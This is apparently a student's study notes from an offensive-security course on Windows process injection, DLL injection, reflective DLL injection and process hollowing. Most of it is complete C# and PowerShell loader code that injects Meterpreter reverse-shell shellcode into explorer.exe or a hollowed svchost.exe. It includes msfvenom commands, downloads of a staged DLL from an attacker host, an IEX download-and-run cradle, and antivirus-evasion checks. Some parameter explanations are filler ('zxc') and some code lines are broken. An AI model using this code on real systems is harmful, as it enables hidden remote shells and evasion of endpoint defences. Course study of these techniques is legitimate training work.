![[Pasted image 20240602014009.png]]

Having demonstrated various methods for obtaining a reverse shell, it is now appropriate to delve into the inner workings of these techniques and explore how code can be manually injected into other programs and migrated between different processes.

It necessarily operates within a process when securing a reverse shell. Typically, a shellcode runner launches the shell within its process. This approach has potential drawbacks. 
- If the victim closes the application, the shell die.
- Security software might detect unusual network communications from a process that normally does not generate much traffic and could consequently block the shell.

Overcoming these challenges can be achieved through **Process injection and migration**.

[Process Injection, Technique T1055 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1055/)

# 5.1 Finding a Home for Shellcode
## 5.1.1 Process Injection and Migration Theory

By definition, a process is a container created to house a running application. Each Windows process maintains its own virtual memory space. Although these spaces are not designed to interact directly with one another, such interaction can potentially be facilitated using various Win32 APIs.

In contrast, a thread executes the compiled assembly code of the application. A process may host multiple threads to perform simultaneous actions, with each thread possessing its own stack while sharing the virtual memory space of the process.

To provide an overview, initiating Windows-based process injection typically involves opening a channel from one process to another through the Win32 [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) API. The memory space of the target process is then modified using the [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) and [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) APIs. Subsequently, a new execution thread is created inside the remote process using [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread).

Process target: `explorer.exe`

**Process Injection only works for processes running at the same or lower integrity level of the current process.**

```bash
4520   1196   Basic_Shellcode_Runner.exe      F:\OSEP\Payloads\Basic_Shellcode_Runner.exe
1196   8852   explorer.exe                    C:\Windows\explorer.exe


meterpreter > migrate -N lsass.exe 
[*] Migrating from 4520 to 964...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient: privileges)                        
meterpreter > migrate -N explorer.exe
[*] Migrating from 4520 to 1196...
[*] Migration completed successfully.
meterpreter > getpid
Current pid: 1196
```

![](https://raw.githubusercontent.com/col-1002/OSEP-Course/main/Attachment/List%20running%20processes_v1.png)

#### OpenProcess

The OpenProcess API opens an existing local process for interaction and it's take three param:
- dwDesiredAccess: Set the required [access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) on that remote process.
- bInheritHandle: determines if the returned handle may be inherited by a child process
- dwProcessId: specifies the process identifier of the target process aka **Process ID**

#### Others API

In previous shellcode runner, using these Win32 APIs like `VirtualAlloc`, `RtlMoveMemory`, `CreateThread` only works inside the current process.

Therefore, to works in remote processes, we must using `VirtualAllocEx`, `WriteProcessMemory` and `CreateRemoteThread`.

Process injection with `VirtualAllocEx` and `WriteProcessMemory` is considered a standard technique, but there are a few others to consider. The low-level native APIs `NtCreateSection`, `NtMapViewOfSection`, `NtUnMapViewOfSection`, and `NtClose` in **ntdll.dll** can be used as alternatives to `VirtualAllocEx` and `WriteProcessMemory`.
- [NTDLL.DLL](https://en.wikipedia.org/wiki/Microsoft_Windows_library_files#NTDLL.DLL) exports the Windows Native API.

## 5.1.2 Process Injection in C`#`

Create C# code that performs process injection using the these Win APIs:
- OpenProcess
- VirtualAllocExNuma
- NtCreateSection
- NtMapViewOfSection
- CreateRemoteThread
- NtUnMapViewOfSection
- NtClose

Then convert the code to Jscript with DotNetToJscript. 

Step 1. Create a Console Application (.NET Framework) called "Shellcode_Process_Injection"
Step 2. Declaring and importing the Win32 APIs discussed earlier
Step 3. Put it all together
Step 4. Compile and execute
Step 5. Check the current Process Identifier + Filter processes "explorer" by name

### Declaring and importing the Win32 APIs discussed earlier

**`DllImport`**: This attribute is used in C# to declare a method that is implemented in an unmanaged DLL. In this case, it specifies `kernel32.dll` or `ntdll.dll`, which is a core Windows library containing basic system functions

**`SetLastError`**: When set to `true`, it indicates that the `Marshal.GetLastWin32Error` method will be able to get the error code if this function call fails.

**`ExactSpelling`**: When set to `true`, it prevents the .NET runtime from trying to automatically append "A" or "W" (for ANSI or Unicode versions respectively) to the end of the function name.
#### OpenProcess API 

Open the local process, in this case is `explorer.exe`

```cs
public const uint ProcessAllFlags = 0x001F0FFF;

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

            // The OpenProcess opens an existing local process for interaction e.g: explorer.exe
            string targetedProc = "explorer"; //change
            int procId = Process.GetProcessesByName(targetedProc).First().Id; // Grab the right Process ID
            // Get a handle on the remote process
            IntPtr pHandle = OpenProcess(ProcessAllFlags, false, procId);
            Console.WriteLine($"Got handle {pHandle} on PID {procId} ({targetedProc}).");
```

- `dwDesiredAccess`: set the required [access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) on the remote process. Its value will be checked against the [Security Descriptors](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors). In our case, we request the PROCESS_ALL_ACCESS process right, which will give us complete access to the "explorer.exe" process. PROCESS_ALL_ACCESS has a hexadecimal representation of "0x001F0FFF".
- `bInheritHandle`: don't care about created child process
- `dwProcessId`: Process ID

#### VirtualAllocExNuma

[VirtualAllocExNuma](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma) function Reserves, commits, or changes the state of a region of memory within the virtual address space of the specified process, and specifies the NUMA node for the physical memory.

```cs
[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

	IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

	// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.123 LPORT=443 -f csharp
	byte[] buf = new byte[511] { SHELLCODE_GO_HERE };

	int len = buf.Length;
	uint uLen = (uint)len;
```

- **`hProcess`**: A handle to the process in which memory will be allocated. Use of `GetCurrentProcess()` in the function call suggests that memory is being allocated in the address space of the current process.
- **`lpAddress`**: The desired starting address of the allocated memory. When set to `IntPtr.Zero`, the system determines where to allocate the memory.
- **`dwSize`**: The size of the memory region to allocate, in bytes. In this case, `0x1000` or 4096 bytes.
- **`flAllocationType`**: The type of memory allocation. `0x3000` corresponds to `MEM_COMMIT | MEM_RESERVE`, indicating that memory is both reserved and committed.
- **`flProtect`**: The memory protection desired for the allocated region. `0x4` corresponds to `PAGE_READWRITE`, allowing read and write access to the allocated memory.
- **`nndPreferred`**: The preferred NUMA node for the memory allocation. Setting this to `0` specifies that the memory should be allocated from the closest available NUMA node.

#### Memory Section Creation and Mapping

**`NtCreateSection`, `NtMapViewOfSection`, `NtUnmapViewOfSection`, `NtClose`** functions from `ntdll.dll` are used for creating and managing memory sections and mappings.

e.g: [NtCreateSection](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection) creates a memory section with execute-read-write permissions.

```cs
[DllImport("ntdll.dll", SetLastError = true)]
static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
		
// Create a RWX memory section with the size of the payload using 'NtCreateSection'
IntPtr sHandle = new IntPtr();
long cStatus = NtCreateSection(ref sHandle, GenericAll, IntPtr.Zero, ref uLen, PageReadWriteExecute, SecCommit, IntPtr.Zero);
Console.WriteLine($"Created new shared memory section with handle {sHandle}. Success: {cStatus == 0}.");
```

- `SectionHandle`: Pointer to a HANDLE variable that receives a handle to the section object.
- `DesiredAccess`:  [access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) The caller can perform all normal operations on the object -> GENERIC_ALL
- `ObjectAttributes`: Ignore
- `MaximumSize`: zxc
- `SectionPageProtection`: zxc
- `AllocationAttributes`: zxc
- `FileHandle`: Ignore

#### CreateRemoteThread

Execute the shellcode

```cs
[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

 // Execute the remotely mapped memory using 'CreateRemoteThread' (EWWW high-level APIs!!!)
IntPtr hThread =  CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero)
```

- `pHandle`: Process handle 
- `lpThreadAttributes`: the desired security descriptor of the new thread
- `dwStackSize`: set these to "0" to accept the default values
- `lpStartAddress`: specify the starting address of the thread. In this case, it must be equal to the address of the buffer allocated and copied shellcode into inside the "explorer.exe" process
- `lpParameter`: is a pointer to variables which will be passed to the thread function pointed to by "lpStartAddress". Since shellcode does not need any parameters => pass a NULL here.
- `dwCreationFlags`: ignore
- `lpThreadId`: ignore

### Final code

```cs
using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace RemoteShinjectLowlevel
{
    class Program
    {
        // FOR DEBUGGING
        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        static extern int memcmp(byte[] b1, byte[] b2, long count);

        static bool ByteArrayCompare(byte[] b1, byte[] b2)
        {
            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }
        // END DEBUGGING

        public const uint ProcessAllFlags = 0x001F0FFF;
        public const uint GenericAll = 0x10000000;
        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;
        public const uint PageReadWriteExecute = 0x40;
        public const uint SecCommit = 0x08000000;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize,
            out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            // allocate memory in the virtual address space of current process
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

            // if (mem == null) { return; } // Sandbox evasion

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.123 LPORT=443 -f csharp
            byte[] buf = new byte[510] { SHELLCODE_GO_HERE; }

            int len = buf.Length;
            uint uLen = (uint)len;

            // Get a handle on the local process
            IntPtr lHandle = Process.GetCurrentProcess().Handle;

            // Opens an existing local process for interaction e.g: explorer.exe
            string targetedProc = "explorer"; //change the process name
            int procId = Process.GetProcessesByName(targetedProc).First().Id; // Grab the right Process ID
            IntPtr pHandle = OpenProcess(ProcessAllFlags, false, procId); // Get a handle on the remote process

            // Create a RWX memory section with the size of the payload using 'NtCreateSection'
            IntPtr sHandle = new IntPtr();
            long cStatus = NtCreateSection(ref sHandle, GenericAll, IntPtr.Zero, ref uLen, PageReadWriteExecute, SecCommit, IntPtr.Zero);
            Console.WriteLine($"Created new shared memory section with handle {sHandle}. Success: {cStatus == 0}.");

            // Map a view of the created section (sHandle) for the LOCAL process using 'NtMapViewOfSection'
            IntPtr baseAddrL = new IntPtr();
            uint viewSizeL = uLen;
            ulong sectionOffsetL = new ulong();
            long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL, IntPtr.Zero, IntPtr.Zero, out sectionOffsetL, out viewSizeL, 2, 0, PageReadWrite);

            // Map a view of the same section for the specified REMOTE process (pHandle) using 'NtMapViewOfSection'
            IntPtr baseAddrR = new IntPtr();
            uint viewSizeR = uLen;
            ulong sectionOffsetR = new ulong();
            long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR, IntPtr.Zero, IntPtr.Zero, out sectionOffsetR, out viewSizeR, 2, 0, PageReadExecute);

            // Copy shellcode to locally mapped view, which will be reflected in the remote mapping section due to shared memory
            Marshal.Copy(buf, 0, baseAddrL, len);

            // DEBUG: Read memory at remote address and verify it's the same as the intended shellcode
            byte[] remoteMemory = new byte[len];
            IntPtr noBytesRead = new IntPtr();
            bool result = ReadProcessMemory(pHandle, baseAddrR, remoteMemory, remoteMemory.Length, out noBytesRead);
            bool sameSame = ByteArrayCompare(buf, remoteMemory);
            Console.WriteLine($"DEBUG: Checking if shellcode is correctly placed remotely...");
            if (sameSame != true)
            {
                Console.WriteLine("DEBUG: NOT THE SAME! ABORTING EXECUTION.");
                return;
            }
            else
            {
                Console.WriteLine("DEBUG: OK.");
            }
            // END DEBUG

            // Execute the remotely mapped memory
            IntPtr hThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero)

			// Cleanup
            uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL); // Unmap the locally mapped section view
            int clStatus = NtClose(sHandle); // Close the section to free resources
        }
    }
}
```

### Compile and excute

**Before compiling the project, set the CPU architecture to x64**

![](https://raw.githubusercontent.com/col-1002/OSEP-Course/main/Attachment/set%20the%20CPU%20architecture%20to%20x64_v1.png)

Check the current process ID -> "explorer.exe"

![](https://raw.githubusercontent.com/col-1002/OSEP-Course/main/Attachment/Process%20Injection%20in%20Csharp_v1.png)

# 5.2 DLL Injection

References:
- https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection
- https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1055-process-injection/dynamic-link-library-injection
- https://sec.vnpt.vn/2019/01/dll-injection/

Process injection allowed attacker to inject arbitrary shellcode into a remote process and execute it. But for larger codebases or pre-existing DLLs, attacker might want to inject an entire DLL into a remote process instead of just shellcode. 

An attacker writes the path of a malicious DLL into the address space of a target process and then calls [LoadLibrary](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)

## 5.2.1 DLL Injection Theory
Process Injection: Dynamic-link Library Injection, Sub-technique [T1055.001 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1055/001/)

Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.

DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as `VirtualAllocEx` and `WriteProcessMemory`, then invoked with `CreateRemoteThread` (which calls the [LoadLibrary](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) API responsible for loading the DLL). [1](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)

Purpose: Load malicious DLL in to process (`explorer.exe`)

## 5.2.2 DLL Injection method

Some of DLL injection methods are

1. **CreateRemoteThread()**: This is the most common and straightforward method for DLL injection. It involves creating a new thread in the target process that calls `LoadLibrary()` to load the desired DLL into the process.

2. **NtCreateThreadEx()**: A more advanced and less documented API that can be used to create a thread in another process, similar to `CreateRemoteThread()`, but with more flexibility and some additional features that might bypass certain security checks.

3. **QueueUserAPC()**: This method queues an Asynchronous Procedure Call (APC) to a thread within the target process. The queued APC executes when the thread enters an alertable state, typically used for injecting code rather than DLLs.

4. **SetWindowsHookEx()**: A technique used to set a hook in the target process, which will load a specified DLL into the process. This method is often used to inject DLLs into processes that interact with the user interface, like those processing Windows messages.

5. **RtlCreateUserThread()**: Similar to `CreateRemoteThread()`, but uses a lower-level NT API. It provides an alternative way to start execution of code in another process and is often used in more sophisticated code injection scenarios.

6. **SetThreadContext()**: This method involves modifying the thread context of an existing thread in the target process. It can be used to redirect the thread to execute arbitrary code when it resumes execution.

7. **Reflective DLL Injection**: Unlike the other methods that rely on the Windows API to load a DLL, Reflective DLL Injection loads a DLL from memory without using the Windows API. This method involves crafting a DLL that can map itself into memory when executed.

## 5.2.3 Basic DLL injection in C`#`

Create a new C# .NET Console Application that will fetch DLL from the attacker’s web server. Then write the DLL to disk since `LoadLibrary` only accepts files present on disk.

The final code

```cs
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;

namespace Basic_DLL_Injection_in_CSharp
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            String dllName = "C:\\Windows\\Temp\\staged_shell.dll";

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.123 LPORT=443 -f dll -o staged_shell.dll
            WebClient wc = new WebClient();
            wc.DownloadFile("http://10.0.0.123/staged_shell.dll", dllName);

            // OpenProcess called on the target process (explorer.exe) 
            Process[] expProc = Process.GetProcessesByName("explorer"); // Change the Process Name
            int pid = expProc[0].Id;
            IntPtr processHandle = OpenProcess(0x001F0FFF, false, pid);

            // Allocate the virtual memory 
            IntPtr allocMemAddress = VirtualAllocEx(processHandle, IntPtr.Zero, 0x1000, 0x3000, 0x4);

            //  copying the name of the DLL into the target process' memory ("explorer.exe")
            IntPtr bytesWritten;
            Boolean res =  WriteProcessMemory(processHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), dllName.Length, out bytesWritten);

			// determine the "LoadLibrary" memory address
            IntPtr loadLibAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            
            // create a remote thread
            IntPtr hThread = CreateRemoteThread(processHandle, IntPtr.Zero, 0, loadLibAddr, allocMemAddress, 0, IntPtr.Zero);
        }
    }
}
```

Compile and execute. It's will fetch the `staged_shell` DLL from the Web Server (Apache) and give back the connection.

This basic method DLL Injection does write the DLL to disk.

# 5.3 Reflective DLL Injection

References:
- https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
- https://www.ired.team/offensive-security/code-injection-process-injection/reflective-shellcode-dll-injection
- https://github.com/stephenfewer/ReflectiveDLLInjection

## 5.3.1 Reflective DLL injection theory

Reflective DLL injection is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process. As such the library is responsible for loading itself by implementing a minimal [Portable Executable (PE)](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format) file loader. It can then govern, with minimal interaction with the host system and process, how it will load and interact with the host.

In order to implement reflective DLL injection, we could write custom code to essentially recreate and improve upon the functionality of LoadLibrary by reuse existing code to execute these techniques 

The ultimate goal of this technique is to maintain the essential functionality of `LoadLibraryA` while avoiding the write to disk and avoiding detection by tools such as Process Explorer.

## 5.3.2 Reflective DLL Injection in PowerShell

Using this script [Invoke-ReflectivePEInjection.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) to avoid writing assemblies to disk, after which it parses the desired PE file. It has two separate modes, the first is to reflectively load a DLL or EXE into the same process, and the second is to load a DLL into a remote process

This script produces an error but does not affect the functionality of the script and can be ignored.

Reflective_DLL_Injection_in_PowerShell.ps1
```powershell
PowerShell -ExecutionPolicy Bypass

# load the DLL into a byte array and retrieve the "explorer" process ID
$bytes = (New-Object System.Net.WebClient).DownloadData('http://10.0.0.123/staged_shell.dll') 
$procid = (Get-Process -Name explorer).Id

# Import module
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1

# supply the byte array (-PEBytes) and process ID (-ProcId) and execute the script.
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

Practice: Create a small script and host that file in Web Server. -> downloads and executes it directly from memory.

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.123/Reflective_DLL_Injection_in_PowerShell.ps1')
```

# 5.4 Process Hollowing

References:
- https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations
- https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1055-process-injection/process-hollowing
- https://github.com/m0n0ph1/Process-Hollowing

From previous section, attacker injected code into processes such as `explorer.exe`. Although this activity is somewhat masked by using familiar process names, detection is still possible due to network activity originating from processes that typically do not generate it. In this section, the focus will shift to migrating to `svchost.exe`, which normally generates network activity.

The challenge is that all `svchost.exe` processes run by default at SYSTEM integrity level, preventing injection from a lower integrity level. Moreover, launching a `svchost.exe` process and attempting to inject into it would cause the process to immediately terminate.

To overcome this, a `svchost.exe` process will be launched and modified before it begins executing. This technique, aka **Process Hollowing**, is designed to execute the payload without terminating the process.

## 5.4.1 Process Hollowing Theory

[Process Injection: Process Hollowing, Sub-technique T1055.012 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1055/012/)

Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.

Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as `CreateProcess`, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as `ZwUnmapViewOfSection` or `NtUnmapViewOfSection` before being written to, realigned to the injected code, and resumed via `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, then `ResumeThread` respectively.[1](http://www.autosectools.com/process-hollowing.pdf)[2](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)

This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process/

## 5.4.2 Process Hollowing in C`#`
References:
- https://sec.vnpt.vn/2019/01/process-hollowing/
- https://viblo.asia/p/tim-hieu-ve-process-hollowing-V3m5WRmxlO7#


Step 1: Initialization and Suspended Process Creation "svchost.exe"

Step 2: Querying Process Information: Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)

Step 3: Get entry point of the actual process executable. This one is a bit complicated, because this address differs for each process (due to [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization))

From the PEB (address we got in last call), we have to do the following:
1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

Step 4: Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable

Step 5: Resume the thread to trigger the staged payload

### The final code

```cs
using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // AV evasion: Sleep for 10s and detect if time really passed
            //DateTime t1 = DateTime.Now;
            //Sleep(10000);
            //double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            //if (deltaT < 9.5) { return; }

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.123 LPORT=443 -f csharp
            byte[] buf = new byte[510] { SHELLCODE_GO_HERE };

            // Start 'svchost.exe' in a suspended state
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint rvaOffset = e_lfanew + 0x28;

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pInfo.hThread);
        }
    }
}
```

### Compile and excute

